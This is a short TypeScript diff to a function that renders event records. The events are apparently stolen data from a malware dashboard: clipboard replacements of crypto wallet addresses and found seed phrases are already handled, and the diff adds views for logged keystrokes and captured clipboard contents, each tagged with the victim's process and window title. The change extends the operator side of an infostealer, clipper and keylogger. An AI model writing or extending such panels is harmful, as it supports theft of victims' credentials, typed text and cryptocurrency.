@@ -78,6 +78,14 @@ export function eventView(event: { kind: string; data?: Record<string, unknown> 
       const keys = ['coin', 'original', 'replacement'];
       return view('Clipboard replaced', [...pick(data, keys), ...rest(data, keys)]);
     }
+    case 'keystroke': {
+      const keys = ['process', 'title', 'text'];
+      return view('Keystroke', [...pick(data, keys), ...rest(data, keys)]);
+    }
+    case 'clipboard': {
+      const keys = ['process', 'title', 'content', 'kind'];
+      return view('Clipboard', [...pick(data, keys), ...rest(data, keys)]);
+    }
     case 'seed_found': {
       const keys = ['words', 'value'];
       return view('Seed found', [...pick(data, keys), ...rest(data, keys)]);
